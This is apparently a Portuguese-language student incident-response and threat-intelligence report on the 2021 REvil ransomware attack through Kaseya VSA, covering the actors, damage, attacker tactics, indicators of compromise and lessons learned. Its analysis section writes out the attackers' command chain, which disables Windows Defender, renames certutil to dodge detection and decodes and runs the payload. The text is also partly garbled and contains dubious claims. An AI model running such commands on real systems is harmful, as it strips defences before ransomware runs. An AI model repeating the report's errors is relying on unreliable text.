# Investigação de Incidente contra Fornecedor Kaseya

**Data:** 24/04/2024  
**Relevância:** Alta

**Autores:** Juliano Soares Corrêa, Bruno de Souza Coutinho, Felipe Limeira de Azeredo, Romulo Willian Sidooski, Luiz Felipe Coelho Varanda, Gabriel Damas  
**Público-Alvo:** ACADITI  
**Principais Decisões:** Este relatório contém as Técnicas, Táticas e Procedimentos para sanitizar um ambiente contaminado com o Ransomware de alta engenhosidade utilizado no ataque à empresa Kaseya.

## Conteúdo

1. **Linha do Tempo da Investigação**
   - **Contexto:** Apresenta o histórico do ataque.
   - **Agentes Envolvidos:** Detalha a organização por trás do ataque, a empresa atacada e partes afetadas.
   - **O Incidente:** Descreve como ocorreu o incidente e as técnicas utilizadas.
   - **Danos do Incidente:** Impacto na empresa e em terceiros.
   - **Resposta ao Incidente:** Ações tomadas para mitigar a vulnerabilidade.
   - **Relatório de Inteligência:** Destaques e análises da equipe.
   - **Lições Aprendidas:** Melhorias implementadas após o incidente.

![timeline](https://github.com/gabrielDamDam/relatorio-Kaseya/blob/main/image.png)

2. **Contextualização**
   Em 2 de julho de 2021, a empresa Kaseya foi alvo de um ataque de ransomware de alta engenhosidade. Este evento teve repercussões globais devido à sua base de clientes extensa e ao papel crítico que desempenha na operação de sistemas de TI. O incidente destacou a importância da segurança cibernética e da proteção de infraestruturas críticas de TI.

## 3. Agentes Envolvidos

### 3.1. A Vítima: Kaseya

A Kaseya é uma empresa de tecnologia sediada nos Estados Unidos que fornece uma variedade de soluções de software para gerenciamento de infraestrutura de TI e prestação de serviços de TI gerenciados (MSPs-Managed Service Providers). Fundada em 2000, a Kaseya se destaca por oferecer uma plataforma integrada de gerenciamento de serviços de TI que permite aos MSPs e empresas gerenciar e monitorar eficientemente sistemas de TI distribuídos.

As soluções da Kaseya abrangem uma variedade de áreas, incluindo gerenciamento de endpoints, automação de tarefas de rotina, monitoramento de rede, backup e recuperação de dados, segurança cibernética e conformidade, entre outros. Seus produtos são projetados para ajudar organizações de todos os tamanhos a simplificar e otimizar a gestão de sua infraestrutura de TI.

Após o incidente, a Kaseya tomou medidas para mitigar os impactos do ataque e reforçar a segurança de seus produtos e serviços, ao mesmo tempo em que continuou a oferecer suporte aos clientes afetados e colaborou com autoridades e especialistas em segurança cibernética para investigar o incidente.

### 3.2. A Organização Criminosa: REvil

O grupo REvil, também conhecido como Sodinokibi, emergiu pela primeira vez em meados de 2019 como um dos mais proeminentes grupos de ransomware do mundo. Sua sofisticada infraestrutura e táticas agressivas rapidamente os tornaram uma ameaça significativa para organizações em todo o mundo.
Eles são conhecidos por exigir grandes resgates em troca da descriptografia de dados roubados e muitas vezes ameaçam vazar informações confidenciais caso as vítimas se recusem a pagar.

### 3.3. Terceiros Envolvidos

Pelo fato de a empresa possuir ferramentas que abrangem uma variedade de áreas, incluindo gerenciamento de endpoints e gerenciamento de TI no geral, um software dela foi utilizado para espalhar o vírus para diversas empresas que utilizavam os produtos da Kaseya, tornando a área de ataque muito maior do que se podia esperar.


4. O Incidente

## Vulnerabilidade Explorada no Incidente da Kaseya em 2021

A vulnerabilidade explorada no incidente da Kaseya em 2021 estava presente em seu produto chamado VSA (Virtual System Administrator). O VSA é uma solução de software usada por empresas de serviços gerenciados de TI (MSPs) para monitorar e gerenciar remotamente os sistemas de seus clientes.

### Detalhes da Vulnerabilidade

- **Tipo de Vulnerabilidade:** Execução de Código Remoto
- **Servidor Afetado:** VSA da Kaseya
- **CVE:** CVE-2021-30116

### Como o Ataque Ocorreu

Os invasores exploraram a vulnerabilidade CVE-2021-30116, uma vulnerabilidade zero-day, permitindo a execução de código remoto não autorizado nos servidores VSA da Kaseya. Isso resultou na comprometimento dos servidores VSA dos clientes da Kaseya, os quais foram usados para distribuir e executar ransomware nos sistemas finais dos clientes.

### Tática Utilizada

Para garantir o sucesso da operação, os hackers distribuíram atualizações falsas após o comprometimento dos servidores. Essa artimanha desativou as defesas, permitindo a execução do ransomware nos endpoints gerenciados pela Kaseya VSA.

### Impacto

A exploração bem-sucedida dessa vulnerabilidade resultou em um ataque de grande escala, afetando centenas de empresas em todo o mundo e causando interrupções significativas nos serviços de TI de muitas organizações.

## 5. Danos do Incidente

O ataque da Kaseya em 2021 causou estragos consideráveis: mais de 30 MSPs e cerca de 1.500 clientes foram vítimas da ofensiva. A natureza de supply-chain do ataque evidenciou a fragilidade da era digital: um único ponto de falha pode desencadear um efeito cascata de proporções catastróficas.

A empresa de segurança cibernética Huntress Labs disse que o software atacado “foi usado para criptografar mais de 1.000 empresas”, das quais os hackers exigiram resgate. O alcance do ataque "É provavelmente o maior ataque de ransomware (para exigir o pagamento do resgate) de todos os tempos", disse Ciaran Martin, professor de segurança cibernética da Universidade de Oxford. “Dependendo do tamanho da empresa e se ela tiver ou não backups, pode levar semanas antes que consigam restaurar tudo”, disse Mark Loman, diretor de engenharia da empresa de segurança digital Sophos.

## 6. A Resposta ao Incidente

Após a descoberta e confirmação da vulnerabilidade, a Kaseya trabalhou em colaboração com especialistas em segurança cibernética para desenvolver e lançar patches de segurança para corrigir o problema e mitigar os riscos associados à exploração da vulnerabilidade.

A Kaseya trabalhou diligentemente para desenvolver e lançar patches de segurança destinados a corrigir a vulnerabilidade CVE-2021-30116, juntamente com outras falhas de segurança que foram identificadas como parte da investigação pós-ataque.

Esses patches foram projetados para fortalecer a segurança do software VSA e mitigar os riscos associados à exploração da vulnerabilidade de execução de código remoto. Além disso, a Kaseya implementou outras medidas de segurança e melhores práticas para ajudar a proteger seus produtos e serviços contra-ataques futuros.

## 7. Relatório de Inteligência

### Inteligência

#### ALVO REvil

#### 7.1.1 Quando surgiu esse grupo?

O grupo REvil, também conhecido como Sodinokibi, emergiu pela primeira vez em meados de 2019 como um dos mais proeminentes grupos de ransomware do mundo. Sua sofisticada infraestrutura e táticas agressivas rapidamente os tornaram uma ameaça significativa para organizações em todo o mundo.

Os primeiros registros datam de junho de 2019, quando aproximadamente 400 clínicas dentárias em todo os Estados Unidos sofreram ataques. Isso causou impactos significativos, uma vez que algumas clínicas não conseguiam realizar procedimentos em pacientes devido à falta de acesso aos seus históricos e raios-x. As empresas responsáveis pelos backups dos dados das clínicas optaram por pagar o resgate e colaboraram com os clientes na descriptografia de seus arquivos. Houve relatos de que o processo de descriptografia não funcionou corretamente ou estava muito lento.

No mês de agosto de 2019, houve um novo ataque direcionado a 22 regiões no Texas, utilizando um software comprometido que era responsável por gerenciar a estrutura municipal. As vítimas relataram que não realizaram o pagamento dos US$ 2,5 milhões exigidos pelos hackers.

No mês de dezembro de 2019, ocorreu outro ataque bem-sucedido, dessa vez envolvendo o pagamento de resgate pela Synoptek, uma empresa localizada na Califórnia que atua no ramo de tecnologia da informação e serviços de hospedagem na nuvem. O grupo REvil empregou uma ferramenta de controle remoto para instalar ransomware nos sistemas dos clientes, causando prejuízos significativos em suas operações. Foi confirmado que mais de 100 clientes do setor de saúde foram afetados, e o REvil solicitou um resgate no valor de US$ 700.000 para a liberação dos sistemas da Synoptek.

O coletivo Revil foi apontado como o autor do ataque em março de 2021 contra a empresa multinacional de tecnologia Acer, no qual os invasores solicitaram um resgate sem precedentes de US$ 50 milhões.

Desde então, o grupo REvil tem sido associado a vários ataques de alto perfil, incluindo o ataque à fornecedora de serviços de TI SolarWinds em 2019 e o ataque à JBS Foods em 2021. Eles são conhecidos por exigir grandes resgates em troca da descriptografia de dados roubados e muitas vezes ameaçam vazar informações confidenciais caso as vítimas se recusem a pagar.

No mês de abril do corrente ano, a entidade fez uma tentativa de chantagem contra a corporação Apple após invadir um de seus parceiros comerciais. Solicitaram o valor de US$ 50 milhões como resgate, com a ameaça de elevar para US$ 100 milhões e expor as informações obtidas do alvo se o pagamento não fosse efetuado dentro do prazo estabelecido.

#### 7.1.2 O que sabemos sobre esse grupo?

Uma das características distintivas do grupo REvil é sua abordagem profissional e empresarial para o crime cibernético. Eles operam como uma organização criminosa bem estruturada, com divisões de trabalho especializadas, suporte técnico para vítimas e uma rede global de afiliados que ajudam a distribuir seu ransomware.

O grupo REvil também é conhecido por investir pesadamente em tecnologia e inovação, adaptando-se rapidamente às mudanças no cenário de segurança cibernética e desenvolvendo novas variantes de ransomware com recursos avançados de criptografia e evasão de detecção.

No entanto, em julho de 2021, o grupo REvil atraiu a atenção global quando misteriosamente desapareceu da internet após uma série de ataques de alto perfil. Apesar disso, especialistas em segurança cibernética acreditam que o grupo possa ressurgir sob um novo nome ou continuar suas atividades sob disfarce.

O REvil/Sodinokibi é famoso por suas táticas agressivas de extorsão, exigindo resgates significativos em troca da descriptografia de dados criptografados. Eles também se destacam por sua abordagem profissional ao crime cibernético, incluindo a oferta de suporte técnico para vítimas e a operação de uma plataforma na dark web para negociação de resgates.

#### 7.1.3 Técnicas e Táticas desse Grupo

Phishing e Engenharia Social: O grupo REvil muitas vezes inicia seus ataques por meio de campanhas de phishing direcionadas, nas quais os criminosos enviam e-mails de phishing enganosos contendo links maliciosos ou anexos infectados para enganar os usuários a clicar e baixar o ransomware.

Exploração de Vulnerabilidades: O grupo REvil é conhecido por explorar vulnerabilidades em software e sistemas desatualizados para ganhar acesso aos sistemas das vítimas. Eles frequentemente se aproveitam de vulnerabilidades conhecidas e publicamente divulgadas para infiltrar-se em redes corporativas.

Uso de Ferramentas de Acesso Remoto: Uma vez dentro da rede da vítima, o grupo REvil geralmente utiliza ferramentas de acesso remoto, como o RDP (Remote Desktop Protocol), para se mover lateralmente e ganhar acesso privilegiado a sistemas críticos.

Criptografia de Dados: O ransomware REvil/Sodin é conhecido por sua capacidade de criptografar arquivos em sistemas infectados, tornando-os inacessíveis para os usuários legítimos. O grupo exige então um pagamento de resgate em troca da chave de descriptografia.

Extorsão e Vazamento de Dados: Além da criptografia de dados, o grupo REvil frequentemente ameaça vazar dados confidenciais das vítimas caso o resgate não seja pago. Isso aumenta a pressão sobre as organizações afetadas para ceder às demandas dos criminosos.

Operação de Infraestrutura de Ataque: O grupo REvil opera uma infraestrutura sofisticada de comando e controle (C&C) na dark web, onde eles coordenam suas atividades maliciosas, gerenciam vítimas e conduzem negociações de resgate.

#### 7.1.4 Alvos Preferenciais

Os alvos preferenciais do grupo REvil incluem organizações de médio a grande porte em uma variedade de setores. Essas são algumas das indústrias visadas pelo REvil.

- Empresas de TI e MSPs (Provedores de Serviços Gerenciados): O grupo REvil frequentemente visa empresas de tecnologia da informação e provedores de serviços gerenciados (MSPs) devido ao acesso privilegiado que essas empresas têm aos sistemas de seus clientes.
- Setor de Saúde: Hospitais, clínicas médicas e outras organizações de saúde são frequentemente alvos do REvil devido à sensibilidade dos dados que eles mantêm e à necessidade crítica de acesso contínuo a sistemas e informações.
- Empresas Financeiras e Bancos: Instituições financeiras, empresas de serviços financeiros e bancos são alvos atraentes para o REvil devido aos dados financeiros sensíveis que possuem e à importância crítica de manter a disponibilidade de sistemas financeiros.
- Empresas de Manufatura e Cadeia de Suprimentos: O REvil também tem como alvo empresas de manufatura e organizações envolvidas na cadeia de suprimentos devido à sua posição central na economia global e aos dados críticos que possuem.
- Empresas de Tecnologia e Software: Empresas de tecnologia e desenvolvedores de software são frequentemente visados pelo REvil devido ao acesso privilegiado a informações confidenciais e à potencial influência que possuem sobre outras organizações.
- Instituições Governamentais: Embora menos comuns, instituições governamentais também podem ser alvos do REvil, especialmente aquelas responsáveis por serviços críticos ou que mantêm dados sensíveis.

#### 7.1.5 Modo de Operação

O grupo REvil opera de forma profissional e empresarial, empregando um modelo de negócios sofisticado que envolve várias etapas.

- Desenvolvimento de Ransomware: O grupo REvil investe em pesquisa e desenvolvimento para criar e aprimorar seu ransomware, que é uma ferramenta maliciosa usada para criptografar os dados das vítimas. Eles podem desenvolver novas variantes do ransomware para contornar medidas de segurança e aumentar suas chances de sucesso.
- Ataques Direcionados: O grupo realiza ataques direcionados a organizações de alto valor, incluindo empresas de médio a grande porte em diversos setores. Eles exploram vulnerabilidades em sistemas de TI e utilizam táticas de engenharia social para ganhar acesso aos sistemas das vítimas.
- Extorsão de Resgate: Após criptografar os dados das vítimas, o grupo exige o pagamento de um resgate em troca da chave de descriptografia. Eles geralmente exigem grandes quantias de dinheiro e podem aumentar a pressão sobre as vítimas ameaçando vazar dados confidenciais se o resgate não for pago.
- Negociação de Resgate: O REvil opera uma plataforma na dark web onde as vítimas podem entrar em contato e negociar o pagamento do resgate. Eles oferecem suporte técnico para ajudar as vítimas a efetuarem o pagamento e receberem a chave de descriptografia.
- Operação de Infraestrutura de Comando e Controle: O grupo mantém uma infraestrutura de comando e controle (C&C) na dark web, onde coordenam suas atividades maliciosas, gerenciam vítimas e conduzem negociações de resgate. Eles utilizam técnicas avançadas de anonimato para proteger sua identidade e evitar a detecção por autoridades.

### 7.1.6 Conexões e Parcerias do Grupo REvil

As conexões e parcerias do grupo REvil são áreas de interesse na investigação de suas atividades criminosas.

- Afiliados e Parceiros de Distribuição: O grupo REvil opera um modelo de afiliação, onde eles recrutam parceiros de distribuição para espalhar seu ransomware e realizar ataques em seu nome. Esses afiliados podem ser hackers independentes ou grupos criminosos menores que recebem uma porcentagem dos lucros dos ataques em troca de sua participação.
- Fornecedores de Serviços Cibernéticos: O REvil pode ter parcerias com fornecedores de serviços cibernéticos que oferecem suporte técnico, serviços de hospedagem de infraestrutura de comando e controle (C&C) e outras ferramentas e recursos necessários para conduzir seus ataques. Isso pode incluir provedores de serviços na dark web que oferecem serviços de anonimato e hospedagem de sites.
- Possíveis Conexões com Outros Grupos Cibercriminosos: O grupo REvil pode ter conexões ou associações com outros grupos cibercriminosos que compartilham informações, ferrament


## 8.2 Requisição de Inteligência

### 8.2.1 Fluxo do Ataque a Kaseya

O método de acesso inicial para clientes Kaseya é o Supply Chain Commitment TTP (MITRE ATT&CK) T1059.002. A plataforma Kaseya VSA envia um arquivo codificado em base64 (agent.crt) na pasta “C:\kworking” para o cliente. Este arquivo será usado para atualizar o 'Kaseya VSA Hotfix'.

O seguinte comando do PowerShell iniciou o arquivo “C:\Program Files (x86)\Kaseya\ <ID>\AgentMon.exe” na plataforma Kaseya VSA. O ator da ameaça REvil usa o PowerShell como seu modus operandi.

```bash
"C:\WINDOWS\system32\cmd.exe" /c ping 127.0.0.1 -n 4979 > nul & C:\Windows\ System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference 
DisableRealtimeMonitoring $true -PreventionStrueStrue true -DisableIOAVProtection 
$true -DisableScriptScan $true -EnableControlledFolderAccess Desativado EnableNetworkProtection AuditMode -Force -MAPSDisable Report -
SubmitSamplesConsent NeverSend & copy /Y C:\Windows\System32\cert%C. > C:\ Windows\cert.exe & C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\    agent.exe & del /q /f c:\kworking\agent.crt C:\Windows\cert.exe & c:\kworking\agent.exe
```

Este comando primeiro desabilitará a proteção em tempo real do Windows Defender:

```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference DisableRealtimeMonitoring $true
```

O comando do PowerShell desabilitará algumas funcionalidades do Windows Defender:


- “DisableIOAVProtection $true”: Desativa a verificação de arquivos baixados e anexados.
- “DisableScriptScanning $true”: Desativa a verificação de scripts durante a verificação de malware.
- “EnableControlledFolderAccess Disabled”: Desativa a proteção de dados no sistema operacional contra aplicativos maliciosos e ameaças, como ransomware. A funcionalidade de "acesso controlado a pastas" está incluída no Windows 10 e no Windows Server 2019.
- “Enable NetworkProtection AuditMode -Force”: Neste modo, mostra quais endereços IP e domínios podem ser bloqueados, mas não bloqueia esses endereços IP e domínios perigosos.
- “MAPSReporting desativado”: Desativa a integração com o Microsoft Proactive Protection Services (MAPS).
- “SubmitSamplesConsent NeverSend”: Impede que o Windows Defender envie amostras para a Microsoft.

Depois de desabilitar os recursos de segurança do Windows Defender, o comando PowerShell criará uma cópia do utilitário certutil.exe na pasta “C: Windows” chamada cert.exe. O grupo REvil usa o arquivo cert.exe para escapar das regras de descoberta usando cloaking. Os agentes de ameaças costumam usar programas nativos do Windows em suas operações para contornar os controles de segurança de proteção. Rundll32.exe, cmd.exe e certutil.exe são alguns desses programas raiz.

certutil.exe é um arquivo binário do Windows usado para manipular certificados. Os agentes de ameaças usam certutil.exe como um binário "Life Outside the World" (LOLBin) para fins maliciosos. À medida que aumenta o uso de programas de sistema legítimos, as ferramentas de segurança podem monitorar nomes de programas em tempo real para detectar uso suspeito. Para evitar esta detecção, os agentes maliciosos renomeiam os programas nativos do sistema operacional.

```bash
copiar /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe
```
O comando do PowerShell adicionará caracteres aleatórios ao final de cert.exe para evitar que os sistemas de segurança encontrem o executável com base em regras de hash:

```bash
eco %RANDOM% >> C:\Windows\cert.exe
```
O comando então decodifica o arquivo Agent.crt codificado em base64 e o salva como Agent.exe:

```bash
C:\Windows\cert.exe -decode c:\kworking\agent.crt c:\kworking\agent.exe
```

O comando do PowerShell exclui os arquivos Agent.crt e cert.exe para remover artefatos gerados no sistema da vítima:

```bash
del /q /f c:\kworking\agent.crt C:\Windows\cert.exe
```
Por fim, o comando PowerShell executa o arquivo Agent.exe, assinado digitalmente com um certificado válido da "PB03 TRANSPORT LTD".

## 8.2.2 Indicadores de Comprometimento (IOC)
Caminhos e Binários da Kaseya:
Caminho: C:\Program Files (x86)\Kaseya\…\AgentMon.exe
Descrição: Binário legítimo da Kaseya usado para execução remota. O Agentmon.exe é um componente crítico do software Kaseya VSA (Virtual System Administrator). Ele funciona como um agente de software instalado em dispositivos gerenciados e desempenha papéis essenciais na comunicação e gerenciamento remoto.
Arquivos e Executáveis Maliciosos:
Caminho: C:\windows\cert.exe
Descrição: O arquivo C:\windows\cert.exe não é um componente legítimo do software Kaseya. Na verdade, a presença desse arquivo nessa pasta específica é um forte indício de atividade maliciosa relacionada ao ataque de ransomware Kaseya VSA de 2021.
Caminho: C:\kworking\agent.crt
Descrição: Esse arquivo malicioso desempenhou um papel inicial no ataque. Era armazenado temporariamente na pasta C:\kworking\ - diretório padrão usado pelo software Kaseya. O agent.crt era, na verdade, um arquivo compactado contendo a carga principal do ransomware. O malware usava o programa legítimo "certutil.exe" do Windows para decodificar o agent.crt e liberar o ransomware no sistema.
Caminho: C:\kworking\agent.exe
Descrição: é o arquivo executável do agente Kaseya VSA (Virtual System Administrator). O VSA é uma plataforma de gerenciamento de TI usada por provedores de serviços gerenciados (MSPs) e equipes internas de TI para monitorar e gerenciar remotamente dispositivos de rede, como servidores, desktops e dispositivos móveis.
Observação: Binário malicioso primário REvil, que solta o legítimo msmpeng.exe e a DLL maliciosa mpsvc.dll.
Atividades de Ataque:
Endereços IP:
18.223.199.234
161.35.239.148
35.226.94.113
162.253.124.162
Acessos a URLs:
/dl.asp
/cgi-bin/KUpload.dll
/userFilterTableRpt.asp
Criação de Arquivos no Servidor VSA da Kaseya:
Caminho: Kaseya/WebPages/ManagedFiles/VSATicketFiles/Screenshot.jpg
Caminho: /Kaseya/webpages/managedfiles/vsaticketfiles/agent.crt
Caminho: /Kaseya/webpages/managedfiles/vsaticketfiles/agent.exe

## 8.3 Relatório da Equipe de Inteligência
	
Em 2 de julho de 2021, uma série de relatórios de clientes da Kaseya revelou comportamento incomum em endpoints gerenciados pelo Kaseya VSA, seguido por relatos de ransomware em execução nesses endpoints. Nosso alto índice de confiança indica que esta campanha foi orquestrada pelo grupo de ransomware REvil conhecido como Sodinokibi. 
Esta vulnerabilidade foi descoberta anteriormente pelo Instituto Holandês de Divulgação de Vulnerabilidades (DIVD CSIRTD) e relatada à Kaseya, mas nossa investigação descobriu que um patch ainda estava em andamento no momento do ataque, portanto os clientes não tiveram acesso à correção. Em relação à vítima, identificamos dois perfis: aqueles que usavam o Kaseya VSA diretamente e aqueles que dependiam de serviços MSP para gerenciar sua infraestrutura. Um ataque direto ao servidor MSP que posteriormente afetou os clientes foi um ataque típico à cadeia de suprimentos. Estimamos que mais de 30 MSPs e pelo menos 1.500 clientes foram afetados. Estamos confiantes de que o grupo REvil/Sodinokibi demonstrou a capacidade de ter um impacto significativo num grande número de vítimas, ganhandolhes o estatuto de “inovadores” na Comunicação Estruturada de Ameaças (STIX 2.1). 
O incidente sinalizou uma evolução nas táticas do grupo, até então não havia dados sobre a exploração de vulnerabilidades zero-day. Existe alguma incerteza sobre o âmbito do plano de ataque, a velocidade de execução, o âmbito do impacto e o grau de exploração da vulnerabilidade do dia 0, o que indica uma preparação significativa para o ataque. O REvil já teve como alvo vítimas em vários setores, incluindo transporte, finanças, petróleo e gás, tecnologia, saúde, manufatura e telecomunicações. Embora muitos dos ataques do grupo sejam considerados oportunistas, a nossa investigação reforça a nossa elevada confiança de que o sector financeiro continua a ser um alvo principal. Estas vantagens baseiam-se, entre outros aspectos, na confidencialidade da informação tratada e nas oportunidades de ganhos financeiros que este sector apresenta ao Grupo.
### 8.3.1 Principais lacunas de inteligência
Identidade da vítima:
Não está claro como o grupo REvil identificou outras vítimas além daqueles cujos servidores VSA estavam conectados à Internet. A metodologia utilizada para identificar infraestruturas vulneráveis para outras vítimas não foi detalhada. Dois. Vetores de ataque iniciais contra a infraestrutura Kaseya:
Devido à falta de informações detalhadas sobre o incidente de Kaseya, o vetor exato do ataque inicial à infraestrutura é desconhecido. Compreender como o REvil comprometeu inicialmente os servidores da Kaseya pode fornecer informações importantes sobre futuras melhorias de segurança. 3. Detalhes de detecção de vulnerabilidade:
Não há informações sobre como a equipe do REvil descobriu vulnerabilidades específicas na infraestrutura da Kaseya. Compreender esse processo pode ajudá-lo a melhorar a segurança, prevendo possíveis pontos de exploração. 4. Informações sobre empresas e países afetados:
Não foram encontradas informações sobre quais empresas foram afetadas pelo ransomware ou em quais países as vítimas estavam localizadas. Essas informações são importantes para entender a abrangência geográfica do evento. 5. Plano de ataque:
A natureza oportunista ou estruturada do ataque não está claramente definida. A falta de detalhes sobre o plano de ataque, seja ele um ataque de oportunidade ou um ataque preventivo, é uma omissão significativa. 6. Impacto geral da campanha:
O impacto total da campanha é desconhecido. Para avaliar a verdadeira dimensão de um incidente, é essencial obter informações detalhadas, incluindo custos financeiros, perturbações operacionais e recuperação. 7. Assine o REvil:
Não há informações específicas sobre outros membros do REvil. Se você continuar a implantar a atividade, qual TTP você está usando atualmente? 8. Motivações e objetivos específicos:
As motivações e objetivos exatos do grupo REvil para atacar diferentes sectores não são totalmente compreendidos. Compreender essas motivações pode ajudá-lo a evitá-las no futuro. Estas lacunas representam áreas onde informações adicionais seriam valiosas para compreender completamente o incidente e informar futuras estratégias de segurança.

### 8.3.2 Correção do Ransomware
 	Link com o passo a passo para aplicar a “vacina” contra o ransomware o REvil_documentation.pdf (nomoreransom.org) 
● Link para baixar a “vacina” contra o ransomware.
 Bitdefender Offers Free Universal Decryptor for REvil/Sodinokibi Ransomware

   ### 8.3.3 Sugestões de Melhotias

● Aplicar patches/atualizações imediatamente após o lançamento/teste, desenvolver/manter o programa de correção, se necessário.
⦁	Implemente filtros de spam nos gateways de e-mail e mantenha assinaturas e regras atualizadas.
⦁	Bloquear endereços IP suspeitos no firewall e mantenha as regras do firewall atualizadas
⦁	Implemente o controle de acesso com base no princípio de menor privilégio.
⦁	Desative o uso de SMBv1 (e todos os outros serviços e protocolos vulneráveis) e requer pelo menos SMBv2. Restringindo/Minimizando/eliminando o uso de RDP
Além das melhoras práticas citadas acima, sugerimos a adoção de diversas medidas de segurança extras conforme apresentado na tabela a seguir. Estes são controles sugeridos pelo CIS Controls como medidas de mitigação e correção de vulnerabilidades para um ambiente exposto aos tipos de TTP’s explorados pelo Grupo REvil.
ChatGPT
8.3 Relatório da Equipe de Inteligência
Em 2 de julho de 2021, uma série de relatórios de clientes da Kaseya revelou comportamento incomum em endpoints gerenciados pelo Kaseya VSA, seguido por relatos de ransomware em execução nesses endpoints. Nosso alto índice de confiança indica que esta campanha foi orquestrada pelo grupo de ransomware REvil conhecido como Sodinokibi. Esta vulnerabilidade foi descoberta anteriormente pelo Instituto Holandês de Divulgação de Vulnerabilidades (DIVD CSIRTD) e relatada à Kaseya, mas nossa investigação descobriu que um patch ainda estava em andamento no momento do ataque, portanto os clientes não tiveram acesso à correção.

Em relação à vítima, identificamos dois perfis: aqueles que usavam o Kaseya VSA diretamente e aqueles que dependiam de serviços MSP para gerenciar sua infraestrutura. Um ataque direto ao servidor MSP que posteriormente afetou os clientes foi um ataque típico à cadeia de suprimentos. Estimamos que mais de 30 MSPs e pelo menos 1.500 clientes foram afetados. Estamos confiantes de que o grupo REvil/Sodinokibi demonstrou a capacidade de ter um impacto significativo num grande número de vítimas, ganhando-lhes o estatuto de "inovadores" na Comunicação Estruturada de Ameaças (STIX 2.1).

O incidente sinalizou uma evolução nas táticas do grupo, até então não havia dados sobre a exploração de vulnerabilidades zero-day. Existe alguma incerteza sobre o âmbito do plano de ataque, a velocidade de execução, o âmbito do impacto e o grau de exploração da vulnerabilidade do dia 0, o que indica uma preparação significativa para o ataque. O REvil já teve como alvo vítimas em vários setores, incluindo transporte, finanças, petróleo e gás, tecnologia, saúde, manufatura e telecomunicações. Embora muitos dos ataques do grupo sejam considerados oportunistas, a nossa investigação reforça a nossa elevada confiança de que o setor financeiro continua a ser um alvo principal. Estas vantagens baseiam-se, entre outros aspectos, na confidencialidade da informação tratada e nas oportunidades de ganhos financeiros que este setor apresenta ao Grupo.

### 8.3.1 Principais lacunas de inteligência
Identidade da vítima: Não está claro como o grupo REvil identificou outras vítimas além daqueles cujos servidores VSA estavam conectados à Internet. A metodologia utilizada para identificar infraestruturas vulneráveis para outras vítimas não foi detalhada.
Vetores de ataque iniciais contra a infraestrutura Kaseya: Devido à falta de informações detalhadas sobre o incidente de Kaseya, o vetor exato do ataque inicial à infraestrutura é desconhecido. Compreender como o REvil comprometeu inicialmente os servidores da Kaseya pode fornecer informações importantes sobre futuras melhorias de segurança.
Detalhes de detecção de vulnerabilidade: Não há informações sobre como a equipe do REvil descobriu vulnerabilidades específicas na infraestrutura da Kaseya. Compreender esse processo pode ajudá-lo a melhorar a segurança, prevendo possíveis pontos de exploração.
Informações sobre empresas e países afetados: Não foram encontradas informações sobre quais empresas foram afetadas pelo ransomware ou em quais países as vítimas estavam localizadas. Essas informações são importantes para entender a abrangência geográfica do evento.
Plano de ataque: A natureza oportunista ou estruturada do ataque não está claramente definida. A falta de detalhes sobre o plano de ataque, seja ele um ataque de oportunidade ou um ataque preventivo, é uma omissão significativa.
Impacto geral da campanha: O impacto total da campanha é desconhecido. Para avaliar a verdadeira dimensão de um incidente, é essencial obter informações detalhadas, incluindo custos financeiros, perturbações operacionais e recuperação.
Assinatura do REvil: Não há informações específicas sobre outros membros do REvil. Se você continuar a implantar a atividade, qual TTP você está usando atualmente?
Motivações e objetivos específicos: As motivações e objetivos exatos do grupo REvil para atacar diferentes setores não são totalmente compreendidos. Compreender essas motivações pode ajudá-lo a evitá-las no futuro. Estas lacunas representam áreas onde informações adicionais seriam valiosas para compreender completamente o incidente e informar futuras estratégias de segurança.
8.3.2 Correção do Ransomware
Link com o passo a passo para aplicar a "vacina" contra o ransomware o REvil_documentation.pdf (nomoreransom.org)
Link para baixar a "vacina" contra o ransomware.
Bitdefender Offers Free Universal Decryptor for REvil/Sodinokibi Ransomware
8.3.3 Sugestões de Melhorias
Aplicar patches/atualizações imediatamente após o lançamento/teste, desenvolver/manter o programa de correção, se necessário.
Implemente filtros de spam nos gateways de e-mail e mantenha assinaturas e regras atualizadas.
Bloquear endereços IP suspeitos no firewall e mantenha as regras do firewall atualizadas.
Implemente o controle de acesso com base no princípio de menor privilégio.
Desative o uso de SMBv1 (e todos os outros serviços e protocolos vulneráveis) e requer pelo menos SMBv2. Restringindo/Minimizando/eliminando o uso de RDP.
Além das melhores práticas citadas acima, sugerimos a adoção de diversas medidas de segurança extras conforme apresentado na tabela a seguir. Estes são controles sugeridos pelo CIS Controls como medidas de mitigação e correção de vulnerabilidades para um ambiente exposto aos tipos de TTPs explorados pelo Grupo REvil.

# Lições aprendidas
O ataque da Kaseya serve como um lembrete urgente da importância crucial da segurança cibernética em cadeias de suprimentos digitais. A necessidade de aprimorar práticas de defesa, fortalecer a colaboração entre os setores e estar sempre pronto para responder a incidentes cibernéticos jamais foi tão evidente.
O ataque da Kaseya acende um alerta vermelho: a vigilância constante, a implementação diligente de melhores práticas de segurança cibernética e o desenvolvimento de estratégias resilientes são essenciais para proteger as organizações contra ameaças cibernéticas cada vez mais sofisticadas.
Juntos, podemos construir um futuro digital mais seguro e resiliente.

# Feedback
Havendo necessidade de mais esclarecimentos, solicito que entre em contato através do e-mail gabriel.damas057@gmail.com.

